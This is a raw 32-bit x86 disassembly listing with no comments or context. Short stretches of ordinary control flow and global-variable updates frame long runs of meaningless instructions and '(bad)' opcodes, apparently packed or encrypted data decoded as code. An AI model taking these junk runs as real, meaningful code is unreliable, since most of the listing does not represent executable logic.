  40d555:	jmp    0x40e979
  40d55a:	mov    DWORD PTR ds:0x42a835,0x19ca
  40d564:	jmp    0x40d7bc
  40d569:	leave  
  40d56a:	ret    
  40d56b:	enter  0xd6c6,0xd9
  40d56f:	fld    st(3)
  40d571:	int    0x93
  40d573:	fdiv   st,st(0)
  40d575:	adc    al,0x59
  40d577:	fmul   QWORD PTR [ebp-0x64]
  40d57a:	stos   DWORD PTR es:[edi],eax
  40d57b:	js     0x40d5f5
  40d57d:	xor    eax,0xb878787e
  40d582:	jno    0x40d5fc
  40d584:	push   edx
  40d585:	aad    0xe1
  40d587:	out    0xdc,eax
  40d589:	jae    0x40d5d9
  40d58b:	retf   
  40d58c:	ins    BYTE PTR es:[edi],dx
  40d58d:	in     eax,0x92
  40d58f:	xchg   esi,eax
  40d590:	dec    esp
  40d591:	and    DWORD PTR [edi+0x38],0x4c2b00aa
  40d598:	mov    esp,0x84025d54
  40d59d:	jg     0x40d5a8
  40d59f:	mov    al,0xeb
  40d5a1:	sub    edx,eax
  40d5a3:	jo     0x40d553
  40d5a5:	int    0x90
  40d5a7:	jmp    0x47bd67d4
  40d5ac:	ret    0x111b
  40d5af:	test   ecx,ecx
  40d5b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5b2:	inc    ebp
  40d5b3:	inc    edi
  40d5b4:	or     eax,0xd6cc8295
  40d5b9:	pop    ds
  40d5ba:	mov    es,ecx
  40d5bc:	xchg   ecx,eax
  40d5bd:	fst    st(1)
  40d5bf:	ret    0x272e
  40d5c2:	fst    DWORD PTR ds:0x78a179cc
  40d5c8:	push   es
  40d5c9:	xor    ah,dl
  40d5cb:	ror    BYTE PTR [ecx],0x6b
  40d5ce:	pop    esp
  40d5cf:	sti    
  40d5d0:	or     BYTE PTR es:[esp-0x15],bl
  40d5d5:	dec    ebp
  40d5d6:	fsub   st(5),st
  40d5d8:	sub    al,0xaf
  40d5da:	out    0x17,eax
  40d5dc:	(bad)  
  40d5dd:	aas    
  40d5de:	sar    BYTE PTR [ebp+0x16c83e2],1
  40d5e4:	fcom   DWORD PTR [ecx+0xa]
  40d5e7:	arpl   WORD PTR [edx],sp
  40d5e9:	inc    ecx
  40d5ea:	mov    eax,ds:0x7cebd91d
  40d5ef:	xchg   edi,eax
  40d5f0:	inc    ebx
  40d5f2:	mov    DWORD PTR [ebx+0xa],ecx
  40d5f5:	jge    0x40d57a
  40d5f7:	sbb    eax,DWORD PTR [ebx+0x32]
  40d5fa:	ins    DWORD PTR es:[edi],dx
  40d5fb:	pusha  
  40d5fc:	pop    edx
  40d5fd:	push   ss
  40d5fe:	jecxz  0x40d63f
  40d600:	aaa    
  40d601:	xor    al,0xd2
  40d603:	add    dl,al
  40d605:	repnz and eax,esi
  40d608:	pop    eax
  40d609:	into   
  40d60a:	jae    0x40d5a0
  40d60c:	push   ds
  40d60d:	xor    ecx,DWORD PTR [ebp+0x1512a1ec]
  40d613:	leave  
  40d614:	and    DWORD PTR [edx+0xea64753],0x44
  40d61b:	mov    ds:0x3bada4e7,eax
  40d620:	int3   
  40d621:	ins    BYTE PTR es:[edi],dx
  40d622:	xor    al,ch
  40d624:	push   ebx
  40d625:	retf   
  40d626:	push   0xde5889dc
  40d62b:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40d62d:	fcmovb st,st(1)
  40d62f:	mov    eax,ds:0x6048a1d6
  40d634:	cld    
  40d635:	xor    eax,0xdbb53576
  40d63a:	cmp    ebx,DWORD PTR [edi-0x39a6d2d1]
  40d640:	cmp    edx,ebp
  40d642:	sbb    dl,BYTE PTR [ebp-0x61]
  40d645:	loope  0x40d5cf
  40d647:	jb     0x40d627
  40d649:	sbb    dh,BYTE PTR [edx+ebp*1+0x667b6cf9]
  40d650:	sti    
  40d651:	cld    
  40d652:	ss xor eax,0xa3097828
  40d658:	loope  0x40d657
  40d65a:	retf   
  40d65b:	repz shl DWORD PTR [ecx-0x42e6a36a],cl
  40d662:	xor    cl,BYTE PTR [ebp+eax*8-0x60]
  40d666:	arpl   WORD PTR [esi+0x7e],si
  40d669:	xchg   edx,eax
  40d66a:	mov    ds:0x4958b17d,eax
  40d66f:	dec    ecx
  40d670:	and    BYTE PTR [ebp+edi*8+0x5d],dl
  40d674:	mov    eax,ds:0x2762613e
  40d679:	retf   0xca9d
  40d67c:	sub    edx,DWORD PTR [edi-0x5a6bcf2b]
  40d682:	xchg   esi,eax
  40d683:	mov    dl,0x57
  40d685:	arpl   WORD PTR [edx],bx
  40d687:	dec    ecx
  40d688:	add    eax,0xe56090ed
  40d68d:	popa   
  40d68e:	ror    BYTE PTR [edx+eiz*4],0x92
  40d692:	dec    ebp
  40d693:	test   eax,0x9f0b4abd
  40d698:	stos   DWORD PTR es:[edi],eax
  40d699:	pop    es
  40d69a:	ret    
  40d69b:	daa    
  40d69c:	ins    BYTE PTR es:[edi],dx
  40d69d:	cmc    
  40d69e:	popfw  
  40d6a0:	push   0xfea4a6b1
  40d6a5:	ja     0x40d71b
  40d6a7:	js     0x40d6f8
  40d6a9:	js     0x40d62c
  40d6ab:	(bad)  
  40d6ac:	push   0x3aebf559
  40d6b1:	repz mov ah,BYTE PTR [ebx-0x7a]
  40d6b5:	stc    
  40d6b6:	xlat   BYTE PTR ds:[ebx]
  40d6b7:	outs   dx,DWORD PTR ds:[esi]
  40d6b8:	(bad)  
  40d6b9:	sub    al,0x96
  40d6bb:	pop    edi
  40d6bc:	shl    DWORD PTR [esp+eiz*2+0x213c9d4d],1
  40d6c3:	neg    esi
  40d6c5:	pop    esi
  40d6c6:	int    0xf3
  40d6c8:	adc    al,0xa1
  40d6ca:	mov    edi,0xdd66e150
  40d6cf:	test   BYTE PTR [esi+0x458c3fc3],cl
  40d6d5:	or     cl,al
  40d6d7:	mov    esp,esi
  40d6d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6da:	jns    0x40d73c
  40d6dc:	lods   al,BYTE PTR ds:[esi]
  40d6dd:	mov    ebp,0x6d364304
  40d6e2:	fsubr  QWORD PTR [esi+0x382fe167]
  40d6e8:	out    0xb6,eax
  40d6ea:	mov    DWORD PTR [edi-0x5cb053af],edx
  40d6f0:	jne    0x40d6b0
  40d6f2:	lahf   
  40d6f3:	adc    eax,0x9085a0a9
  40d6f8:	repnz pusha 
  40d6fa:	int    0xf4
  40d6fc:	(bad)  
  40d6fd:	mov    al,0xdc
  40d6ff:	jns    0x40d70e
  40d701:	je     0x40d69a
  40d703:	mov    bl,0xae
  40d705:	bt     DWORD PTR [ebp-0x3be81eb9],ebp
  40d70c:	cmp    BYTE PTR [edx+0x1400cf0b],0x43
  40d713:	sub    al,0xbd
  40d715:	xlat   BYTE PTR ds:[ebx]
  40d716:	int    0x31
  40d718:	sbb    eax,0xb4b16d06
  40d71d:	ror    DWORD PTR [edx+ebp*2-0x51],0x39
  40d722:	jmp    0x6f32:0x7fcb54c
  40d729:	jmp    0xfa1625a4
  40d72e:	xchg   edi,eax
  40d72f:	mov    dl,0xfd
  40d731:	inc    BYTE PTR [ebx+0x248f218b]
  40d737:	mov    ebx,0xea1327ee
  40d73c:	imul   ebx,DWORD PTR [edi+0x73],0x4f
  40d740:	ins    BYTE PTR es:[edi],dx
  40d741:	add    BYTE PTR [ebp-0x73b5bd82],bl
  40d747:	inc    ebx
  40d748:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d749:	sbb    DWORD PTR [edx+ebp*8-0x3badcb2e],eax
  40d750:	adc    edi,DWORD PTR [edi-0x8]
  40d753:	aam    0xc8
  40d755:	setno  bl
  40d758:	mov    ds,WORD PTR [ebp+0x3c3af08b]
  40d75e:	inc    edi
  40d75f:	test   DWORD PTR [edi-0xff2ac9b],esp
  40d765:	push   ebp
  40d766:	push   ecx
  40d767:	inc    esi
  40d768:	adc    BYTE PTR [esi+0x6c],0x15
  40d76c:	jge    0x40d783
  40d76e:	ins    BYTE PTR es:[edi],dx
  40d76f:	ja     0x40d773
  40d771:	add    DWORD PTR [ebx+0x6a],0xf079ee21
  40d778:	fcom   DWORD PTR [eax-0x60]
  40d77b:	scas   al,BYTE PTR es:[edi]
  40d77c:	mov    ecx,esp
  40d77e:	push   ecx
  40d77f:	mov    ah,0xb5
  40d781:	and    eax,0xa863790b
  40d786:	inc    ebp
  40d787:	ins    BYTE PTR es:[edi],dx
  40d788:	lock sar edx,cl
  40d78b:	clc    
  40d78c:	inc    ebp
  40d78d:	lock repz dec ebp
  40d790:	xor    al,0xd4
  40d792:	pop    ecx
  40d793:	fmul   DWORD PTR [esi-0x3]
  40d796:	xchg   edi,eax
  40d797:	mov    WORD PTR [edi],ds
  40d799:	je     0x40d7b5
  40d79b:	cld    
  40d79c:	dec    esi
  40d79d:	xlat   BYTE PTR ds:[ebx]
  40d79e:	sub    eax,0xa4c43177
  40d7a3:	std    
  40d7a4:	imul   ebx,DWORD PTR [edx+0x424b6697],0xffffff99
  40d7ab:	cdq    
  40d7ac:	or     BYTE PTR [edx-0x76],0xfa
  40d7b0:	xor    esi,0xffffff83
  40d7b3:	inc    ebx
  40d7b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7b5:	frstor [esi+0x1d]
  40d7b8:	imul   esp,DWORD PTR [ecx-0x7ee31b],0x33c
  40d7c2:	mov    DWORD PTR ds:0x42a7bd,0x14bd
  40d7cc:	jne    0x40dd11
  40d7d2:	and    eax,DWORD PTR ds:0x42a7c5
  40d7d8:	jmp    0x40da30
  40d7dd:	int    0xca
  40d7df:	(bad)  
  40d7e0:	into   
  40d7e1:	(bad)  
  40d7e3:	aad    0xc9
  40d7e5:	lea    edi,[esi+0x51a1e45d]
  40d7eb:	sub    bh,BYTE PTR ds:0x7878a959
  40d7f1:	xor    eax,0x5a78787e
  40d7f6:	adc    DWORD PTR [eax+0x7b31af48],ebx
  40d7fc:	ficomp DWORD PTR [ecx-0xe]
  40d7ff:	outs   dx,BYTE PTR ds:[esi]
  40d800:	leave  
  40d801:	js     0x40d7a8
  40d803:	stos   BYTE PTR es:[edi],al
  40d804:	icebp  
  40d805:	push   ecx
  40d806:	lahf   
  40d807:	jnp    0x40d7d7
  40d809:	or     al,0xb8
  40d80b:	dec    esp
  40d80c:	pop    ss
  40d80d:	pop    ds
  40d80e:	or     eax,0x32a0e319
  40d813:	test   al,0x44
  40d815:	cli    
  40d816:	sub    ch,BYTE PTR [ebp-0x61]
  40d819:	arpl   WORD PTR [ebx],cx
  40d81b:	or     al,BYTE PTR [edx+0x4a]
  40d81e:	arpl   WORD PTR [esi+0x5607970d],bp
  40d824:	push   edi
  40d825:	xor    ah,BYTE PTR [esi-0x6755f33c]
  40d82b:	jnp    0x40d7fb
  40d82d:	rol    BYTE PTR [ebp-0x25],0xfe
  40d831:	arpl   WORD PTR [ebx+0x30f1813f],bp
  40d837:	push   cs
  40d838:	mov    edi,edx
  40d83a:	pushf  
  40d83b:	dec    edx
  40d83c:	mov    ah,0xa2
  40d83e:	inc    edx
  40d83f:	or     BYTE PTR [edx+0x1efdb9af],dh
  40d845:	xlat   BYTE PTR ds:[ebx]
  40d846:	xlat   BYTE PTR ds:[ebx]
  40d847:	add    bh,BYTE PTR [edx-0x4]
  40d84a:	data16 adc al,0x36
  40d84d:	jmp    0xfd41:0xf697a85c
  40d854:	or     dl,BYTE PTR [ecx]
  40d856:	retf   
  40d857:	dec    esp
  40d858:	xor    BYTE PTR [edx-0x16],cl
  40d85b:	add    DWORD PTR [ebp+0x34c0f35b],0x12df2008
  40d865:	inc    esp
  40d866:	sbb    al,0x3b
  40d868:	aas    
  40d869:	stos   DWORD PTR es:[edi],eax
  40d86a:	imul   ecx,DWORD PTR [ecx-0x41],0x1a
  40d86e:	sbb    DWORD PTR [eax],esp
  40d870:	mov    edx,DWORD PTR [ebp+ebp*1-0x10]
  40d874:	ss jnp 0x40d858
  40d877:	cs jmp 0xee96:0x1641b9d3
  40d87f:	imul   ebp,DWORD PTR [edi+0x21],0xfffffff2
  40d883:	lds    esp,FWORD PTR [ecx+0x11]
  40d886:	xor    BYTE PTR [esi],ah
  40d888:	inc    esi
  40d889:	(bad)
  40d88c:	ja     0x40d907
  40d88e:	or     al,0xcb
  40d890:	sbb    al,0x9f
  40d892:	or     al,0xc4
  40d894:	cmc    
  40d895:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d896:	xchg   DWORD PTR [edi+0x46],edx
  40d899:	sahf   
  40d89a:	inc    ecx
  40d89b:	fisubr WORD PTR [esi]
  40d89d:	and    al,0x1
  40d89f:	jbe    0x40d869
  40d8a1:	or     DWORD PTR [edi+eiz*1-0x7821aab],ebx
  40d8a8:	xor    eax,0x8fcb8161
  40d8ad:	push   ecx
  40d8ae:	(bad)  
  40d8af:	(bad)  
  40d8b0:	push   edi
  40d8b1:	cdq    
  40d8b2:	lea    ebp,ds:0x109de0e7
  40d8b8:	rcl    BYTE PTR [edi],1
  40d8ba:	sbb    ah,0x2e
  40d8bd:	push   0x41
  40d8bf:	out    dx,eax
  40d8c0:	dec    esp
  40d8c1:	or     eax,0x79db7797
  40d8c6:	in     eax,0x3e
  40d8c8:	cs (bad) 
  40d8ca:	cld    
  40d8cb:	jb     0x40d912
  40d8cd:	and    bh,dh
  40d8cf:	cmp    DWORD PTR [edx+0x4cc8412],esi
  40d8d5:	push   es
  40d8d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8d7:	inc    ebp
  40d8d8:	or     BYTE PTR [esi-0x7e9c6961],0xcc
  40d8df:	xor    al,0x3b
  40d8e1:	mov    ebx,0x97218fdd
  40d8e6:	fwait
  40d8e7:	(bad)  
  40d8e8:	mov    bl,0x92
  40d8ea:	dec    ebp
  40d8eb:	ins    BYTE PTR es:[edi],dx
  40d8ec:	ja     0x40d942
  40d8ee:	push   ss
  40d8ef:	aad    0xa4
  40d8f1:	mov    DWORD PTR [edx+0x14],edi
  40d8f4:	inc    esi
  40d8f5:	outs   dx,BYTE PTR ds:[esi]
  40d8f6:	jp     0x40d8d3
  40d8f8:	int    0x3e
  40d8fa:	mov    ebx,0x92c401fb
  40d8ff:	pop    esi
  40d900:	pop    esp
  40d901:	icebp  
  40d902:	sar    BYTE PTR [ebx],0x62
  40d905:	and    eax,0xb969068
  40d90a:	ret    0xa1bd
  40d90d:	(bad)  
  40d90e:	push   edx
  40d90f:	lahf   
  40d910:	outs   dx,DWORD PTR ds:[esi]
  40d911:	inc    eax
  40d912:	push   esp
  40d913:	loope  0x40d98e
  40d915:	xor    DWORD PTR [edi-0x78],ebp
  40d918:	ds test eax,0xd4eed8a2
  40d91e:	lock (bad) 
  40d920:	in     al,dx
  40d921:	jge    0x40d971
  40d923:	mov    ds:0x84466a18,eax
  40d928:	xor    edi,ebp
  40d92a:	in     al,0x8d
  40d92c:	pop    ds
  40d92d:	xchg   edx,eax
  40d92e:	sbb    al,0xfa
  40d930:	ret    0x7a67
  40d933:	lods   eax,DWORD PTR ds:[esi]
  40d934:	hlt    
  40d935:	jecxz  0x40d955
  40d937:	pop    es
  40d938:	pop    DWORD PTR [eax+edi*2+0x64]
  40d93c:	jmp    0x7b20a3f2
  40d941:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d942:	call   esp
  40d944:	or     DWORD PTR [edi],ebp
  40d946:	ror    BYTE PTR [edi+eax*2-0x37],0x7
  40d94b:	rol    al,cl
  40d94d:	rcl    ebx,1
  40d94f:	aas    
  40d950:	xchg   DWORD PTR [edi+0x7d],eax
  40d953:	iret   
  40d954:	adc    bl,BYTE PTR [ecx+ebx*4]
  40d957:	and    eax,0xd1135382
  40d95c:	push   0x32
  40d95e:	ins    BYTE PTR es:[edi],dx
  40d95f:	in     al,0x9d
  40d961:	pop    ebp
  40d962:	xor    al,0x2b
  40d964:	lods   al,BYTE PTR ds:[esi]
  40d965:	(bad)  
  40d966:	and    al,0xc5
  40d968:	jmp    0x40d9ab
  40d96a:	je     0x40d9bd
  40d96c:	jmp    0xe3bf93b3
  40d971:	fstp   QWORD PTR [esi+eax*1-0x14a6d15c]
  40d978:	mov    bh,0x1d
  40d97a:	and    BYTE PTR [eax-0x58],0x4d
  40d97e:	or     BYTE PTR [esi],dl
  40d980:	loopne 0x40d99d
  40d982:	inc    edi
  40d983:	mov    ds:0xbb17297a,al
  40d988:	jg     0x40d9e2
  40d98a:	int3   
  40d98b:	or     al,0x8
  40d98d:	sub    BYTE PTR [eax-0x5d5d12b6],bl
  40d993:	arpl   WORD PTR [ecx+0x18e1ccd2],si
  40d999:	inc    eax
  40d99a:	ret    0x3072
  40d99d:	in     al,dx
  40d99e:	dec    eax
  40d99f:	add    eax,0x627711ca
  40d9a4:	enter  0xc09c,0x90
  40d9a8:	add    al,0x7c
  40d9aa:	(bad)  
  40d9ab:	fcom   DWORD PTR [ecx-0x67c15414]
  40d9b1:	fistp  DWORD PTR [ebx+0x61]
  40d9b4:	stos   BYTE PTR es:[edi],al
  40d9b5:	mov    ebx,0x14b4d2c4
  40d9ba:	in     al,dx
  40d9bb:	leave  
  40d9bc:	push   ebp
  40d9bd:	cs retf 
  40d9bf:	jmp    0x95b98dac
  40d9c4:	mov    dl,0xed
  40d9c6:	pop    ecx
  40d9c7:	arpl   si,cx
  40d9c9:	es adc al,0x95
  40d9cc:	pop    ecx
  40d9cd:	jbe    0x40d9c3
  40d9cf:	out    dx,al
  40d9d0:	bound  edi,QWORD PTR [eax-0x11]
  40d9d3:	rcr    cl,0x86
  40d9d6:	mov    ebp,0xc4881ccd
  40d9db:	(bad)  
  40d9dc:	fadd   DWORD PTR [ecx]
  40d9de:	add    eax,DWORD PTR [edx-0x254698da]
  40d9e4:	mov    ebx,0xc0b41cd9
  40d9e9:	pop    esp
  40d9ea:	mov    DWORD PTR [ebx+0x5d],edx
  40d9ed:	pusha  
  40d9ee:	add    dl,bl
  40d9f0:	mov    BYTE PTR [edx],0xca
  40d9f3:	dec    esi
  40d9f4:	and    ah,BYTE PTR [eax+0x62]
  40d9f7:	inc    edx
  40d9f8:	jg     0x40d99c
  40d9fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9fb:	mov    cl,0x31
  40d9fd:	mov    esp,0x4c7c6662
  40da02:	and    BYTE PTR [eax],ch
  40da04:	mov    al,0xe
  40da06:	jg     0x40d9c2
  40da08:	test   BYTE PTR ds:[eax],ch
  40da0b:	test   DWORD PTR [edx+0x17],edx
  40da0e:	xor    edi,ecx
  40da10:	int    0x30
  40da12:	and    dl,BYTE PTR [eax-0x67447dbf]
  40da18:	and    al,BYTE PTR [esi]
  40da1a:	sub    BYTE PTR [eax],al
  40da1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da1d:	stos   DWORD PTR es:[edi],eax
  40da1e:	mov    bh,0xc0
  40da20:	and    cl,dl
  40da22:	lock lahf 
  40da24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da25:	xor    edx,0xbc92bc51
  40da2b:	and    cl,BYTE PTR [ecx-0x7c8c909b]
  40da31:	or     BYTE PTR gs:[eax],al
  40da34:	mov    eax,ds:0x42a831
  40da39:	sbb    eax,DWORD PTR ds:0x42a809
  40da3f:	mov    ds:0x42a831,eax
  40da44:	mov    eax,DWORD PTR [ebp-0x8]
  40da47:	xor    DWORD PTR ds:0x42a7f1,0x42a7bd
  40da51:	sub    eax,DWORD PTR [ebp+0x8]
  40da54:	or     DWORD PTR ds:0x42a801,0xc38
  40da5e:	push   eax
  40da5f:	adc    DWORD PTR ds:0x42a771,0x6147
  40da69:	mov    eax,DWORD PTR [ebp-0x4]
  40da6c:	jmp    0x40dcc4
  40da71:	enter  0xc6c0,0x3c
  40da75:	(bad)  
  40da76:	ret    0xd4da
  40da79:	push   cs
  40da7a:	in     al,dx
  40da7b:	pop    edi
  40da7c:	dec    esi
  40da7d:	fdivp  st(1),st
  40da7f:	pop    esp
  40da80:	pop    esp
  40da81:	push   ss
  40da82:	scas   al,BYTE PTR es:[edi]
  40da83:	js     0x40dafd
  40da85:	xor    eax,0x4a78787e
  40da8a:	mov    ch,dl
  40da8c:	inc    edx
  40da8d:	xlat   BYTE PTR ds:[ebx]
  40da8e:	or     esp,edx
  40da90:	or     cl,dh
  40da92:	push   ebx
  40da93:	call   0xcf5f:0x13006e45
  40da9a:	jl     0x40db0e
  40da9c:	std    
  40da9d:	xchg   edx,eax
  40da9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da9f:	and    dl,BYTE PTR ds:0xc62d92c5
  40daa5:	hlt    
  40daa6:	cmp    DWORD PTR [ebp-0x401d6d2f],edi
  40daac:	inc    ebp
  40daad:	adc    cl,BYTE PTR [ecx+0x716a3b7a]
  40dab3:	ins    BYTE PTR es:[edi],dx
  40dab4:	dec    ebp
  40dab5:	(bad)  
  40dab7:	cmp    esp,esi
  40dab9:	hlt    
  40daba:	dec    esi
  40dabb:	(bad)  
  40dabc:	stc    
  40dabd:	sub    DWORD PTR [eax+0x3e],ebp
  40dac0:	(bad)  
  40dac1:	mov    edi,0x301d202f
  40dac6:	mov    al,ch
  40dac8:	push   eax
  40dac9:	sbb    eax,0x7268916f
  40dace:	add    eax,0x75920228
  40dad3:	popa   
  40dad4:	dec    ebx
  40dad5:	jle    0x40da83
  40dad7:	popf   
  40dad8:	je     0x40dae3
  40dada:	retf   0xf5aa
  40dadd:	in     al,dx
  40dade:	lds    edi,FWORD PTR [edx+0x7f]
  40dae1:	mov    ebp,0x7a388340
  40dae6:	push   0x166153a7
  40daeb:	ror    bl,1
  40daed:	mov    ch,0x40
  40daef:	daa    
  40daf0:	adc    al,0x95
  40daf2:	or     dh,BYTE PTR [esi-0x1e]
  40daf5:	pusha  
  40daf6:	jle    0x40db51
  40daf8:	test   bl,ch
  40dafa:	sbb    al,0x91
  40dafc:	xchg   esi,eax
  40dafd:	aaa    
  40dafe:	lds    edi,FWORD PTR [edx]
  40db00:	outs   dx,DWORD PTR ds:[esi]
  40db01:	dec    esi
  40db02:	dec    ebp
  40db03:	push   ss
  40db04:	in     al,0xff
  40db06:	shr    DWORD PTR [edx+eax*4+0x8],cl
  40db0a:	lock popf 
  40db0c:	outs   dx,DWORD PTR ds:[esi]
  40db0d:	leave  
  40db0e:	and    BYTE PTR [edx-0x71],dl
  40db11:	xchg   ecx,eax
  40db12:	mov    BYTE PTR [edx-0x47],ah
  40db15:	repz push ds
  40db17:	push   ebx
  40db18:	std    
  40db19:	(bad)  
  40db1b:	push   0x32
  40db1d:	bound  esi,QWORD PTR [ebx-0x48235dab]
  40db23:	fadd   DWORD PTR [ecx+0x3c1c211c]
  40db29:	mov    ch,0xd6
  40db2b:	or     BYTE PTR [ecx-0x57004af8],cl
  40db31:	mov    ebx,0xf51817cd
  40db36:	lahf   
  40db37:	outs   dx,DWORD PTR ds:[esi]
  40db38:	jg     0x40dbb7
  40db3a:	sbb    edx,DWORD PTR [eax+0x32]
  40db3d:	pop    eax
  40db3e:	icebp  
  40db3f:	push   0x2dc2aa4e
  40db44:	in     eax,0x67
  40db46:	retf   0x109f
  40db49:	push   cs
  40db4a:	sti    
  40db4b:	sub    al,0x58
  40db4d:	in     al,dx
  40db4e:	ror    DWORD PTR [eax-0x3204943e],cl
  40db54:	cmp    eax,0x642ffbde
  40db59:	add    al,BYTE PTR [ecx+0x71]
  40db5c:	mov    esp,0x8aa94955
  40db61:	add    al,0x3
  40db63:	out    0x1b,eax
  40db65:	arpl   WORD PTR [ecx+0x5d],di
  40db68:	adc    DWORD PTR ds:0xc6de310d,ebx
  40db6e:	retf   0x54b5
  40db71:	in     eax,0x8a
  40db73:	add    dl,BYTE PTR [ecx-0x4b593626]
  40db79:	scas   al,BYTE PTR es:[edi]
  40db7a:	inc    esp
  40db7b:	dec    ebp
  40db7c:	sbb    eax,0xbc554857
  40db81:	xor    BYTE PTR ds:0x6c5dc07a,bl
  40db87:	cmp    cl,BYTE PTR [ebx]
  40db89:	call   0x18d3b0f6
  40db8e:	push   cs
  40db8f:	jmp    0xbd5f:0x845de6f4
  40db96:	push   edi
  40db97:	cmp    BYTE PTR [esi],cl
  40db99:	aas    
  40db9a:	mov    ch,0x43
  40db9c:	sub    ah,BYTE PTR [edi+0x7a]
  40db9f:	test   BYTE PTR [edx-0x53e3fe28],cl
  40dba5:	add    cl,BYTE PTR [ecx-0x65]
  40dba8:	idiv   bh
  40dbaa:	scas   eax,DWORD PTR es:[edi]
  40dbab:	jl     0x40db32
  40dbad:	add    ecx,DWORD PTR ds:0x586c009e
  40dbb3:	(bad)  
  40dbb4:	and    ah,BYTE PTR [edx+esi*1-0x2a]
  40dbb8:	enter  0xae91,0x2b
  40dbbc:	pop    ds
  40dbbd:	push   esi
  40dbbe:	dec    esp
  40dbbf:	rcl    BYTE PTR [esi+ecx*4+0x1b],1
  40dbc3:	sub    esp,DWORD PTR [ecx+0x77895a9]
  40dbc9:	mov    eax,0x28dfd805
  40dbce:	ins    DWORD PTR es:[edi],dx
  40dbcf:	or     bh,BYTE PTR [ecx]
  40dbd1:	push   esp
  40dbd2:	mov    ebx,DWORD PTR [ecx]
  40dbd4:	scas   al,BYTE PTR es:[edi]
  40dbd5:	call   DWORD PTR [esi+0x7f9cf654]
  40dbdb:	or     eax,0xb5e5e37b
  40dbe0:	and    eax,0x5764db75
  40dbe5:	mov    esp,0x2793a607
  40dbea:	js     0x40dc24
  40dbec:	jmp    0x40db96
  40dbee:	sub    al,0x0
  40dbf0:	xchg   ebx,eax
  40dbf1:	xor    BYTE PTR [ecx+0x2d],cl
  40dbf4:	and    esp,edi
  40dbf6:	es in  eax,dx
  40dbf8:	pop    edi
  40dbf9:	jb     0x40dc3c
  40dbfb:	call   FWORD PTR [edx]
  40dbfd:	daa    
  40dbfe:	pshufw mm1,mm6,0x62
  40dc02:	int3   
  40dc03:	cld    
  40dc04:	jb     0x40db89
  40dc06:	mov    BYTE PTR [edx],cl
  40dc08:	fcom   DWORD PTR [ebp-0x6fceccf6]
  40dc0e:	xor    DWORD PTR [bp-0x27],edx
  40dc12:	lock (bad) 
  40dc14:	xchg   ecx,eax
  40dc15:	outs   dx,DWORD PTR ds:[esi]
  40dc16:	mov    eax,ds:0xc5a161bb
  40dc1b:	js     0x40dbe7
  40dc1d:	add    BYTE PTR [eax+0x39fb6005],bh
  40dc23:	mov    al,0x35
  40dc25:	movq   QWORD PTR [ebp+edx*8+0x2a],mm3
  40dc2a:	sbb    cl,bl
  40dc2c:	inc    edi
  40dc2d:	fwait
  40dc2e:	aam    0x5e
  40dc30:	ds sbb al,bh
  40dc33:	jae    0x40dc38
  40dc35:	xlat   BYTE PTR ds:[ebx]
  40dc36:	jae    0x40dc13
  40dc38:	mov    eax,ds:0xa35c1afe
  40dc3d:	dec    esi
  40dc3e:	inc    eax
  40dc3f:	sbb    edx,ecx
  40dc41:	mov    ah,0xbb
  40dc43:	and    edi,DWORD PTR [edx]
  40dc45:	rcr    ah,cl
  40dc47:	dec    esp
  40dc48:	pop    esp
  40dc49:	sbb    bh,ah
  40dc4b:	dec    esi
  40dc4c:	pushf  
  40dc4d:	and    al,0xad
  40dc4f:	xlat   BYTE PTR ds:[ebx]
  40dc50:	(bad)  
  40dc51:	ds mov ch,0x22
  40dc54:	mov    edx,0x1b9bfbd3
  40dc59:	lahf   
  40dc5a:	rol    BYTE PTR [ebx-0x69],cl
  40dc5d:	aaa    
  40dc5e:	fwait
  40dc5f:	neg    BYTE PTR [ecx-0x14]
  40dc62:	lods   eax,DWORD PTR ds:[esi]
  40dc63:	jle    0x40dbf5
  40dc65:	test   eax,0x46b6526b
  40dc6a:	(bad)  
  40dc6b:	cmp    DWORD PTR ds:0x28a96cdc,edi
  40dc71:	scas   eax,DWORD PTR es:[edi]
  40dc72:	stc    
  40dc73:	fimul  WORD PTR [ebx-0x326b04d4]
  40dc79:	cmp    eax,0xd671efa8
  40dc7e:	inc    edx
  40dc7f:	out    dx,al
  40dc80:	mov    eax,ds:0x76e54b72
  40dc85:	mov    bh,0x94
  40dc87:	aas    
  40dc88:	xchg   DWORD PTR [ecx+edx*8-0xb22a4],eax
  40dc8f:	cli    
  40dc90:	test   DWORD PTR [esi-0x72],0x57a08c1a
  40dc97:	daa    
  40dc98:	mov    bh,0x2b
  40dc9a:	push   edx
  40dc9b:	push   cs
  40dc9c:	(bad)  [edi+0x2c]
  40dc9f:	add    ecx,edi
  40dca1:	xchg   ebx,eax
  40dca2:	stos   DWORD PTR es:[edi],eax
  40dca3:	xchg   ecx,eax
  40dca4:	mov    ecx,0x58c6e427
  40dca9:	ss int 0xc2
  40dcac:	aaa    
  40dcad:	mov    ds:0xb81aa3ac,al
  40dcb2:	jl     0x40dc95
  40dcb4:	aas    
  40dcb5:	or     ch,BYTE PTR [edx-0x3bf11e9b]
  40dcbb:	xchg   BYTE PTR [edx],ah
  40dcbd:	push   0x3af8bb71
  40dcc2:	mov    bh,0x96
  40dcc4:	add    eax,DWORD PTR [ebp+0x8]
  40dcc7:	add    DWORD PTR ds:0x42a881,0x296a
  40dcd1:	push   eax
  40dcd2:	adc    DWORD PTR ds:0x42a75d,0x7658
  40dcdc:	call   0x40e99f
  40dce1:	mov    DWORD PTR ds:0x42a7b5,0x7bae
  40dceb:	inc    DWORD PTR [ebp+0x8]
  40dcee:	cmp    DWORD PTR [ebp+0x8],0x52
  40dcf2:	mov    DWORD PTR ds:0x42a831,0x71fa
  40dcfc:	jb     0x40da34
  40dd02:	mov    DWORD PTR ds:0x42a83d,0x568b
  40dd0c:	jmp    0x40e979
  40dd11:	cmp    edi,0x1a2
  40dd17:	jne    0x40e497
  40dd1d:	sbb    DWORD PTR ds:0x42a7b9,edx
